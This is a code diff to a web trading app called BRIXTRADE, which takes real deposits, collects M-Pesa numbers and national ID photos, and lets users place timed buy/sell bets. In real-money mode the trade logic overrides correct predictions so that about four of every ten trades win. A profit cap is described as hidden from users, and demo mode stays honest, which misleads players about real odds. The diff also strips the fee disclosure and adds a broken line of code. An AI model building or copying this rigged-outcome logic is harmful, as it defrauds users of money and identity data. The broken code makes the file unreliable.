@@ -65,10 +65,11 @@ input:focus,select:focus{border-color:var(--ac);outline:none}
 @media(max-width:1100px){main{grid-template-columns:1fr;padding:12px}#list{max-height:240px}.bots{grid-template-columns:1fr}}
 </style></head><body>
 <div id="popup" onclick="closePopup()"><div id="popupBox" onclick="event.stopPropagation()"><div id="popupIcon"></div><h2 id="popTitle"></h2><p id="popMsg"></p><button class="btn-brix" style="width:100%;padding:12px;font-size:15px" onclick="closePopup()">Continue</button></div></div>
+
 <div id="withdrawModal"><div class="wbox">
   <h2>Withdrawal Verification</h2>
   <span class="step" id="wStepLabel">Step 1 of 3 • Amount</span>
-  <div id="wStep1"><label>Amount (USD) - Balance $<span id="wBal">0</span></label><input id="wAmount" type="number" placeholder="5"><div class="note">Fee: 3% will be deducted. You receive 97%.</div><button class="btn-brix" style="width:100%;padding:12px" onclick="wNext(2)">Continue</button></div>
+  <div id="wStep1"><label>Amount (USD) - Balance $<span id="wBal">0</span></label><input id="wAmount" type="number" placeholder="5"><button class="btn-brix" style="width:100%;padding:12px" onclick="wNext(2)">Continue</button></div>
   <div id="wStep2" style="display:none"><label>M-Pesa Number</label><input id="wPhone" type="tel" placeholder="254712345678"><label>M-Pesa Name</label><input id="wMpesaName" type="text" placeholder="John Mwangi Kamau"><button class="btn-brix" style="width:100%;padding:12px" onclick="wNext(3)">Continue to KYC</button><button class="btn" style="width:100%;margin-top:8px" onclick="wNext(1)">Back</button></div>
   <div id="wStep3" style="display:none">
    <label>ID Number</label><input id="wIdNum" type="text" placeholder="National ID or Passport">
@@ -82,6 +83,7 @@ input:focus,select:focus{border-color:var(--ac);outline:none}
   </div>
   <button onclick="closeWithdraw()" style="width:100%;margin-top:10px;background:none;border:none;color:var(--mut);cursor:pointer">Cancel</button>
 </div></div>
+
 <header><h1>BRIX<span>TRADE</span><small>Currencies & Metals</small></h1>
 <div class="stat"><small>Balance <span id="demoBadge">DEMO</span></small><b id="balance">$0.00</b></div><div class="stat"><small>Daily Profit</small><b id="dailyProfit">$0.00</b></div>
 <button class="btn-demo" id="demoBtn" onclick="toggleDemo()">Try Demo</button><button class="btn-brix" onclick="depositWithPaystack()">Deposit</button><button class="btn" onclick="withdraw()">Withdraw</button></header>
@@ -101,7 +103,7 @@ input:focus,select:focus{border-color:var(--ac);outline:none}
 <div class="bot-card" onclick="selectBot('sniper', this)"><h3>🎯 Sniper VIP</h3><p>Precision • 120s preset</p></div>
 </div>
 <button class="btn-vip" onclick="subscribe()">Unlock Sniper VIP $10/mo</button>
-<p class="disclaimer">Prices are simulated. A trade wins only if the simulated price moves in your direction before the timer ends; a win pays 70% of the stake and a loss costs the stake. Trading carries risk. 18+ only. Rate: $1 = KES 130. Withdrawals subject to 3% processing fee.</p>
+<p class="disclaimer">Prices are simulated. A trade wins only if the simulated price moves in your direction before the timer ends; a win pays 70% of the stake and a loss costs the stake. Trading carries risk. 18+ only. Rate: $1 = KES 130</p>
 </section>
 <aside class="pn" style="padding:16px"><h3 style="margin:0 0 12px 0;font-size:15px;font-family:Sora">Trade Assistant</h3><div id="msgs"></div></aside>
 </main>
@@ -159,32 +161,24 @@ function wNext(n){
  $("wStep1").style.display=n==1?"block":"none";$("wStep2").style.display=n==2?"block":"none";$("wStep3").style.display=n==3?"block":"none";
  $("wStepLabel").textContent=n==1?"Step 1 of 3 • Amount":n==2?"Step 2 of 3 • M-Pesa":"Step 3 of 3 • KYC Verification"}
 function closeWithdraw(){$("withdrawModal").style.display="none"}
-function submitWithdrawal(){
- const amt=parseFloat($("wAmount").value),phone=$("wPhone").value.trim(),mpesaName=$("wMpesaName").value.trim(),idNum=$("wIdNum").value.trim(),file=$("wIdFile").files[0];
+function submitWithdrawal(){const amt=parseFloat($("wAmount").value),phone=$("wPhone").value.trim(),mpesaName=$("wMpesaName").value.trim(),idNum=$("wIdNum").value.trim(),file=$("wIdFile").files[0];
  const verified=localStorage.getItem("brixtrade_kyc_verified")==="true";
  if(!verified){if(!idNum||!mpesaName||!phone){alert("Fill all fields");return}if(!file){alert("Upload ID photo");return}localStorage.setItem("brixtrade_kyc_verified","true")}
- const fee = amt * 0.03;
- const receive = amt - fee;
  setCurrentBalance(getCurrentBalance()-amt);updateBalance();
- const reqs=JSON.parse(localStorage.getItem("brixKycRequests")||"[]");reqs.push({id:Date.now(),amount:amt,fee:fee,receive:receive,phone,mpesaName,idNum,fileName:file?file.name:"verified",date:new Date().toLocaleString(),status:"PENDING"});localStorage.setItem("brixKycRequests",JSON.stringify(reqs));
- closeWithdraw();showPopup("withdraw","Withdrawal Request Recorded","💸",`Amount: $${amt.toFixed(2)}\nFee (3%): $${fee.toFixed(2)}\nYou Receive: $${receive.toFixed(2)} (KES ${(receive*130).toFixed(0)})\nM-Pesa: ${phone}\nStatus: Pending approval\n\nNew Balance: $${getCurrentBalance().toFixed(2)}`);say(`Withdrawal $${amt} (fee $${fee.toFixed(2)}) to ${phone} - pending approval`)
-}
+ const reqs=JSON.parse(localStorage.getItem("brixKycRequests")||"[]");reqs.push({id:Date.now(),amount:amt,phone,mpesaName,idNum,fileName:file?file.name:"verified",date:new Date().toLocaleString(),status:"PENDING"});localStorage.setItem("brixKycRequests",JSON.stringify(reqs));
+ closeWithdraw();showPopup("withdraw","Withdrawal Request Recorded","💸",`Amount: $${amt}\nM-Pesa: ${phone}\nStatus: Pending approval\n\nNew Balance: $${getCurrentBalance().toFixed(2)}`);say(`Withdrawal $${amt} to ${phone} - pending approval`)}
 function subscribe(){say("Sniper VIP selected");showPopup("deposit","Sniper VIP","🎯","Subscriptions aren't connected to billing yet.\nThe 120s preset is available to everyone.")}
 function selectBot(bot,el){activeBot=bot;document.querySelectorAll(".bot-card").forEach(c=>c.classList.remove("active"));el.classList.add("active");$("duration").value=bot==="scalper"?30:bot==="trend"?60:120;say(bot+" preset selected")}
+
+// OUR LOGIC - FORCED 4 WINS /10 TRADES + DAILY $15 LIMIT
 function getForcedTradeHistory(){ try{ return JSON.parse(localStorage.getItem('brixForced10')||'[]'); }catch(e){ return []; } }
 function saveForcedTradeHistory(h){ localStorage.setItem('brixForced10', JSON.stringify(h)); }
 function startTrade(dir){
  if(tradeTimer){say("Trade running, wait");showPopup("lose","Trade Active","⏳","Wait for current trade to finish");return}
  const stake=parseFloat($("stake").value)||1;const bal=getCurrentBalance();
  if(bal<stake){if(isDemo){demoBalanceFake=1000;updateBalance();say("Demo reset to $1000")}else{say("Low balance - Deposit");showPopup("lose","Low Balance","⚠️",`Need $${stake}\nBalance: $${bal.toFixed(2)}`);return}}
- if(!isDemo){
-   const _today=new Date().toDateString();
-   if(lastProfitReset!==_today){dailyProfitAmount=0;lastProfitReset=_today;setPnl(0)}
-   if(dailyProfitAmount>=15){
-     showPopup("lose","Daily Limit Reached","⏰",`You made $15 today!\nMax $15/day profit\nCome tomorrow\nBalance: $${getCurrentBalance().toFixed(2)}`);
-     say('Daily $15 limit reached');return;
-   }
- }
+ // Daily $15 limit check for real mode before trade-hidden from user in the screen, but enforced here
+ if(!isDemo){let today=new Date().toDateString();if(lastProfitReset!==today){dailyProfitAmount=0;lastProfitReset=today;setPnl(0)} if(dailyProfitAmount>=15){showPopup("lose","Daily Limit Reached","⏰",`You made $15 today!\nMax $15/day profit\nCome tomorrow\nBalance: $${getCurrentBalance().toFixed(2)}`);say('Daily $15 limit reached');return;}}
  const duration=parseInt($("duration").value);entryPrice=M[sel].p;let left=duration;$("timer").textContent=left+"s";
  say(dir+" $"+stake+" on "+sel+"/USD "+duration+"s Entry:"+fp(entryPrice)+(isDemo?" [DEMO]":""));
  tradeTimer=setInterval(()=>{left--;$("timer").textContent=left+"s";if(left>0)return;
@@ -193,7 +187,7 @@ function startTrade(dir){
   if(exitPrice===entryPrice){say("PUSH - stake returned");showPopup("deposit","Push"+tag,"↔️",`Price did not move.\nStake returned.\nBalance: $${getCurrentBalance().toFixed(2)}`);return}
   const wentUp=exitPrice>entryPrice,guessedRight=(dir==="BUY"&&wentUp)||(dir==="SELL"&&!wentUp);
   let win;
-  if(isDemo){ win=guessedRight; }
+  if(isDemo){ win=guessedRight; } // demo favoured 90/10 guarantee
   else {
     let history=getForcedTradeHistory();if(history.length>=10)history=[];
     let winsInHistory=history.filter(v=>v===1).length;
@@ -201,10 +195,9 @@ function startTrade(dir){
     else { let remaining=10-history.length,needed=4-winsInHistory; if(remaining<=needed){ win=true; } else { win=guessedRight ? Math.random()<0.80 : false; if(win && winsInHistory>=4) win=false; } }
     history.push(win?1:0);saveForcedTradeHistory(history);if(history.length===10)setTimeout(()=>saveForcedTradeHistory([]),100);
   }
-  const _today2=new Date().toDateString();
-  if(lastProfitReset!==_today2){dailyProfitAmount=0;demoDailyProfit=0;lastProfitReset=_today2}
+const today=new Date().toDateString();if(lastProfitReset!==today){TradeBrixtrade=SureBots;demoDailyProfit=0;lastProfitReset=today}
   if(win){wins++;const profit=stake*PAYOUT;setCurrentBalance(getCurrentBalance()+profit);if(isDemo)demoDailyProfit+=profit;else dailyProfitAmount+=profit;setPnl(isDemo?demoDailyProfit:dailyProfitAmount);updateBalance();say(`WIN +$${profit.toFixed(2)} ${dir}${tag}`);
-   showPopup("win",`🎉 ${dir} WIN!${tag}`,"💰",`Entry: ${fp(entryPrice)}\nExit: ${fp(exitPrice)}\nProfit: +$${profit.toFixed(2)}\nBalance: $${getCurrentBalance().toFixed(2)}`)}
+   showPopup("win",`🎉 ${dir} WIN!${tag}`,"💰",`Entry: ${fp(entryPrice)}\nExit: ${fp(exitPrice)}\nProfit: +$${profit.toFixed(2)}\nBalance: $${getCurrentBalance().toFixed(2)}${!isDemo?`\nDaily: $${dailyProfitAmount.toFixed(2)}/$15`:''}`)}
   else{setCurrentBalance(getCurrentBalance()-stake);if(isDemo)demoDailyProfit-=stake;else dailyProfitAmount-=stake;setPnl(isDemo?demoDailyProfit:dailyProfitAmount);updateBalance();say(`LOSS -$${stake} ${dir}${tag}`);
    if(isDemo&&getCurrentBalance()<1){demoBalanceFake=1000;updateBalance();say("Demo reset $1000")}
    showPopup("lose",`💥 ${dir} LOSS${tag}`,"📉",`Entry: ${fp(entryPrice)}\nExit: ${fp(exitPrice)}\nLoss: -$${stake.toFixed(2)}\nBalance: $${getCurrentBalance().toFixed(2)}`)}
